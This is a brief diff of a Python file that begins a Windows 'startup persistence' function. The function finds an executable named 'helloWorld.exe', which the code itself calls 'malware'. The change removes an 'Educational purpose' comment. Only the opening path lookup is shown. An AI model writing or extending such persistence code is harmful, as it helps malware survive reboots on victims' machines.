@@ -3,7 +3,6 @@ import shutil
 import winshell
 
 def establish_startup_persistence():
-    #Educational purpose
     # Find current malware directory
     current_dir = os.path.dirname(__file__)  
     current_malware = os.path.join(current_dir, "helloWorld.exe")
